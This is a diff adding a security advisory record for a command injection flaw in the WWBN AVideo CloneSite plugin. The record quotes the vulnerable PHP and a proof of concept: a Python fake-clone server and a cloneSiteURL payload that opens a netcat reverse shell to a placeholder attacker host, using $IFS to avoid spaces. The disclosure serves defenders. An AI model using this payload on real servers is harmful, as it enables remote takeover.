@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-2mhh-27v7-3vcx",
+  "modified": "2023-05-12T20:20:39Z",
+  "published": "2023-05-12T20:20:39Z",
+  "aliases": [
+    "CVE-2023-32073"
+  ],
+  "summary": "WWBN AVideo command injection vulnerability",
+  "details": "# WWBN AVideo Authenticated RCE \n\nA command injection vulnerability exists at `plugin/CloneSite/cloneClient.json.php` which allows Remote Code Execution if you CloneSite Plugin. This is a bypass to the fix for [CVE-2023-30854](https://cve.report/CVE-2023-30854) which affects WWBN Avideo up to version 12.3\n\n## Vulnerable Code\n\n/plugin/CloneSite/cloneClient.json.php\n\n```php\n$json->sqlFile = escapeshellarg(preg_replace('/[^a-z0-9_.-]/i', '', $json->sqlFile));\n$json->videoFiles = escapeshellarg(preg_replace('/[^a-z0-9_.-]/i', '', $json->videoFiles));\n$json->photoFiles = escapeshellarg(preg_replace('/[^a-z0-9_.-]/i', '', $json->photoFiles));\n\n// get dump file\n$cmd = \"wget -O {$clonesDir}{$json->sqlFile} {$objClone->cloneSiteURL}videos/cache/clones/{$json->sqlFile}\";\n$log->add(\"Clone (2 of {$totalSteps}): Geting MySQL Dump file\");\nexec($cmd . \" 2>&1\", $output, $return_val);\n```\n\nThe `$objClone->cloneSiteURL` is not properly sanitized.\n## Exploit Proof-of-Concept\n\navidexploit.py\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport time\n\nhostName = \"localhost\"\nserverPort = 8080\n\nclass MyServer(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(bytes(\"{\\\"error\\\":false,\\\"msg\\\":\\\"\\\",\\\"url\\\":\\\"https:\\/\\/attacker.com/\\/\\\",\\\"key\\\":\\\"2d6db3c09e41a9c27dbc72aecc4a6fc0\\\",\\\"useRsync\\\":1,\\\"videosDir\\\":\\\"\\/var\\/www\\/html\\/demo.avideo.com\\/videos\\/\\\",\\\"sqlFile\\\":\\\"Clone_mysqlDump_644ab263e62d6.sql\\\",\\\"videoFiles\\\":[],\\\"photoFiles\\\":[]}\", \"utf-8\"))\n\nif __name__ == \"__main__\":        \n    webServer = HTTPServer((hostName, serverPort), MyServer)\n    print(\"Server started http://%s:%s\" % (hostName, serverPort))\n\n    try:\n        webServer.serve_forever()\n    except KeyboardInterrupt:\n        pass\n\n    webServer.server_close()\n    print(\"Server stopped.\")\n```\n\nRun in command line\n```bash\n$ python3 avidexploit.py &\n$ ngrok tcp 8080 # optional if not running in VPS\n```\n- Then get your public facing IP and Port. Enter a cloneSiteURL like the following then hit clone to achieve command injection\n```bash\nhttp://2.tcp.ngrok.io:14599/;nc$IFS'ATTACKER.COM'$IFS'5555'$IFS-e$IFS/bin/sh;#\n```\n\n**It is important to not use white spaces for the exploit to work. Replace whitespace with `$IFS` when adding arguments to your RCE**\n\n\n![poc](https://i.ibb.co/bdpQYcK/2023-05-07-17-04-43-online-video-cutter-com.gif)\n\n## Credits\n\n- JM Sanchez\n- [https://www.linkedin.com/in/juanmarcosanchez/](https://www.linkedin.com/in/juanmarcosanchez/)",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "wwbn/avideo"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "12.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/WWBN/AVideo/security/advisories/GHSA-2mhh-27v7-3vcx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32073"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/WWBN/AVideo/commit/1df4af01f80d56ff2c4c43b89d0bac151e7fb6e3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/WWBN/AVideo"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-05-12T20:20:39Z",
+    "nvd_published_at": "2023-05-12T14:15:10Z"
+  }
+}
